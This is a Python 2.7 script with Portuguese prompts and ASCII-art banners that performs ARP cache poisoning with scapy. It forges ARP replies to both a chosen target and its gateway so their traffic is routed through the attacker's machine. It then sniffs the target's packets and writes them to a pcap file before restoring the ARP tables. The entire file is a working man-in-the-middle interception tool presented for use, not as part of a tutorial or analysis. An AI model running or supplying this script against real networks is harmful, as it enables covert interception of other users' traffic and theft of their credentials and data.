#!/usr/bin/env python2.7
# -*- coding: utf-8 -*-

#   `7MMF'  `7MMF'           `7MMF'   MMP""MM""YMM
#     MM      MM               MM     P'   MM   `7
#     MM      MM       ,AM     MM          MM
#     MMmmmmmmMM      AVMM     MM          MM
#     MM      MM    ,W' MM     MM      ,   MM
#     MM      MM  ,W'   MM     MM     ,M   MM
#   .JMML.  .JMML.AmmmmmMMmm .JMMmmmmMMM .JMML.
#                       MM
#                       MM

from scapy.all import *
import os
import sys
import threading
import signal

def hlt():
    lg = '\033[0;32m █████\033[1;32m╗ \033[0;32m██████\033[1;32m╗ \033[0;32m██████\033[1;32m╗     \033[0;32m███████\033[1;32m╗ \033[0;32m██████\033[1;32m╗ \033[0;32m█████\033[1;32m╗ \033[0;32m██████\033[1;32m╗ \033[0;32m██\033[1;32m╗   \033[0;32m██\033[1;32m╗\n\033[0;32m██\033[1;32m╔══\033[0;32m██\033[1;32m╗\033[0;32m██\033[1;32m╔══\033[0;32m██\033[1;32m╗\033[0;32m██\033[1;32m╔══\033[0;32m██\033[1;32m╗    \033[0;32m██\033[1;32m╔════╝\033[0;32m██\033[1;32m╔════╝\033[0;32m██\033[1;32m╔══\033[0;32m██\033[1;32m╗\033[0;32m██\033[1;32m╔══\033[0;32m██\033[1;32m╗╚\033[0;32m██\033[1;32m╗ \033[0;32m██\033[1;32m╔╝\n\033[0;32m███████\033[1;32m║\033[0;32m██████\033[1;32m╔╝\033[0;32m██████\033[1;32m╔╝    \033[0;32m███████\033[1;32m╗\033[0;32m██\033[1;32m║     \033[0;32m███████\033[1;32m║\033[0;32m██████\033[1;32m╔╝ ╚\033[0;32m████\033[1;32m╔╝\n\033[0;32m██\033[1;32m╔══\033[0;32m██\033[1;32m║\033[0;32m██\033[1;32m╔══\033[0;32m██\033[1;32m╗\033[0;32m██\033[1;32m╔═══╝     ╚════\033[0;32m██\033[1;32m║\033[0;32m██\033[1;32m║     \033[0;32m██\033[1;32m╔══\033[0;32m██\033[1;32m║\033[0;32m██\033[1;32m╔═══╝   ╚\033[0;32m██\033[1;32m╔╝\n\033[0;32m██\033[1;32m║  \033[0;32m██\033[1;32m║\033[0;32m██\033[1;32m║  \033[0;32m██\033[1;32m║\033[0;32m██\033[1;32m║         \033[0;32m███████\033[1;32m║╚\033[0;32m██████\033[1;32m╗\033[0;32m██\033[1;32m║  \033[0;32m██\033[1;32m║\033[0;32m██\033[1;32m║        \033[0;32m██\033[1;32m║\n\033[1;32m╚═╝  ╚═╝╚═╝  ╚═╝╚═╝         ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝\033[0m\n'
    print lg

def restaura_alvo(gateway_ip, gateway_mac, target_ip, target_mac):
    print "[-] Restaurando alvo."
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac),count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac),count=5)
    os.kill(os.getpid(), signal.SIGINT)

def get_mac(ip_adress):
    respostas, ax = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_adress), timeout=2, retry=10)
    for s,r in respostas:
        return r[Ether].src
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target        =  ARP()
    poison_target.op     =  2
    poison_target.psrc   =  gateway_ip
    poison_target.pdst   =  target_ip
    poison_target.hwdst  =  target_mac

    poison_gateway       = ARP()
    poison_gateway.op    = 2
    poison_gateway.psrc  = target_ip
    poison_gateway.pdst  = gateway_ip
    poison_gateway.hwdst = gateway_mac
    print "[-] Iniciando o envenenamento ARP.\n[-] Pressione Ctrl+C para finalizar.\n"
    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            time.sleep(2)
        except KeyboardInterrupt:
            restaura_alvo(gateway_ip, gateway_mac, target_ip, target_mac)
    print "[!] Envenenamento ARP finalizado!"
    return

os.system("clear")
hlt()
interface   = raw_input("[*] Digite a interface[wlan0/eth0]: ")
target_ip   = raw_input("[*] Digite o ip alvo: ")
gateway_ip  = raw_input("[*] Digite o ip do gateway: ")
qtd_pacotes = int(input("[*] Quantidade de pacotes: "))

#interface
conf.iface = interface

#saida
conf.verb  = 0

print "[-] Subindo a interface %s " % interface

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print "[!] Falha ao pegar o MAC do gateway!!!"
    sys.exit(1)
else:
    print "[-] MAC do gateway é %s " % gateway_mac
    print "[-] IP do gateway é %s " % gateway_ip

target_mac = get_mac(target_ip)

if target_mac is None:
    print "[!] Falha ao pegar o MAC do alvo!!!"
    sys.exit(1)
else:
    print "[-] IP do alvo é %s" % target_ip
    print "[-] MAC do alvo é %s" % target_mac

#envenenamento
threadenvenenamento = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
threadenvenenamento.start()

try:
    print "[-] Iniciando sniffer."
    bpf_filter = "ip host %s" % target_ip
    pacotes = sniff(count = qtd_pacotes, filter = bpf_filter, iface = interface)
    #arquivo = raw_input("[*] Digite o nome do arquivo a ser escrito(digite .pcap no final do nome): ")
    #escreve arquivo com os pacotes capturados
    wrpcap("arq.pcap", pacotes)

    #restaura a rede
    restaura_alvo(gateway_ip, gateway_mac, target_ip, target_mac)

except KeyboardInterrupt:
    restaura_alvo(gateway_ip, gateway_mac, target_ip, target_mac)
    sys.exit(0)
